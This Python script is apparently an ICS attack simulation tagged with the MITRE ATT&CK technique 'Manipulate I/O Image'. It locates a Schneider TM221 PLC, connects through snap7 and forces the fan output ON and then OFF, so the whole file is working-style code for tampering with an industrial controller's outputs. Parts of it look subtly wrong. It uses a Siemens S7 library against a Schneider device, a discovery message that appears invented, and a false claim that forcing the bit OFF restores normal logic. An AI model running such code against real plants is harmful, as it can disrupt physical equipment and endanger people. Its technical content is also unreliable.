import snap7
import time
import re
import socket

# MITRE ATT&CK Technique: Inhibit Response Function - Manipulate I/O Image

# This script simulates an attack that manipulates the I/O image of a Schneider Electric TM221CE16R PLC
# to inhibit the normal response function (specifically, controlling the fan).
# It overrides the Q_FAN output, potentially preventing it from turning on/off as designed.

# Function to find the PLC's IP address if not known
def find_plc_ip_address():
    """
    Attempts to discover the PLC's IP address by scanning the local network.
    This is a rudimentary approach and might not work in all network configurations.
    Consider using more robust network scanning tools like nmap for a production environment.
    """
    try:
        # Create a UDP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)  # Timeout after 2 seconds

        # Construct a simple discovery message (adjust as needed for your PLC)
        discovery_message = b"Schneider Electric PLC Discovery"

        # Broadcast the message on the local network (adjust the broadcast address if needed)
        sock.sendto(discovery_message, ('255.255.255.255', 3000))  # Port 3000 is a common discovery port

        # Listen for a response
        data, addr = sock.recvfrom(1024)
        print(f"Received discovery response from {addr[0]}: {data.decode()}")
        sock.close()

        return addr[0]  # Return the IP address from the response

    except socket.timeout:
        print("No PLC discovery response received within the timeout.  Check network and firewall settings.")
        return None
    except Exception as e:
        print(f"An error occurred during IP address discovery: {e}")
        return None



# PLC Configuration - Try to find the PLC, otherwise use a default.
plc_ip = find_plc_ip_address()
if plc_ip is None:
    plc_ip = "192.168.9.24" # Replace with your PLC's IP address if discovery fails.
    print(f"Using default IP address: {plc_ip}.  Discovery failed or returned None.")
else:
    print(f"PLC IP address found: {plc_ip}")

plc_rack = 0
plc_slot = 1

# Tag information
Q_FAN_ADDRESS = 0  # Byte offset for Q_FAN (Q0.0)
Q_FAN_BIT = 0      # Bit offset within the byte for Q_FAN

def manipulate_output(plc, output_address, output_bit, force_on):
    """
    Manipulates a specific output bit in the PLC's output image.

    Args:
        plc: The Snap7 client object.
        output_address: The byte address of the output (e.g., 0 for %Q0.0).
        output_bit: The bit offset within the byte (e.g., 0 for %Q0.0).
        force_on: True to force the output ON, False to force it OFF.
    """
    try:
        # Read the current output byte
        qb = plc.read_area(snap7.const.S7AreaPQ, 0, output_address, 1)  # S7AreaPQ is for process outputs (Q)

        # Modify the specific bit
        original_byte = qb[0]  # Get the byte value
        if force_on:
            new_byte = original_byte | (1 << output_bit)  # Set the bit to 1
        else:
            new_byte = original_byte & ~(1 << output_bit) # Set the bit to 0

        # Write the modified byte back to the output
        qb[0] = new_byte  # Assign the modified byte
        plc.write_area(snap7.const.S7AreaPQ, 0, output_address, qb)  # Write back to output memory

        print(f"Output Q{output_address}.{output_bit} forced {'ON' if force_on else 'OFF'}. Original Byte: {original_byte:08b}, New Byte: {new_byte:08b}")  # Print the original byte

    except Exception as e:
        print(f"Error manipulating output Q{output_address}.{output_bit}: {e}")


def main():
    """
    Main function to connect to the PLC and execute the attack.
    """
    plc = snap7.client.Client()
    try:
        plc.connect(plc_ip, plc_rack, plc_slot)
        print(f"Connected to PLC at {plc_ip}")

        # Simulate overriding the Q_FAN output
        print("Overriding Q_FAN output...")
        manipulate_output(plc, Q_FAN_ADDRESS, Q_FAN_BIT, True)  # Force Q_FAN ON

        time.sleep(5)  # Hold the output for 5 seconds

        manipulate_output(plc, Q_FAN_ADDRESS, Q_FAN_BIT, False) # Force Q_FAN OFF
        print("Q_FAN output returned to normal (controlled by PLC logic).")

    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        if plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")

if __name__ == "__main__":
    main()